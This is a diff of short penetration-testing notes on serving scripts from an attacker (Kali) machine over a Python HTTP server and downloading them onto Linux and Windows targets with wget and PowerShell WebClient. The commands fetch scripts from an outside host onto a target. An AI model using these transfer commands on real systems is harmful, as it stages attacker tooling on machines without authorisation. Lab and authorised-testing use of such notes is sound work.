@@ -2,8 +2,16 @@
 Linux Script Download
 
 cd /var/www/html
-python3 -m http.server
+python3 -m http.server 80
 
 cd /tmp
 wget http://Kali-IP/linux-script/script_linux.sh
-chmod 777 script_linux.sh 
+chmod 777 script_linux.sh
+
+Windows Script Download
+
+cd /var/www/html
+python3 -m http.server
+
+del C:\Users\Public\script_windows.bat
+powershell.exe -c "(new-object System.Net.WebClient).DownloadFile('http://10.8.4.210/windows-script/script_windows.bat','C:\Users\Public\script_windows.bat')"
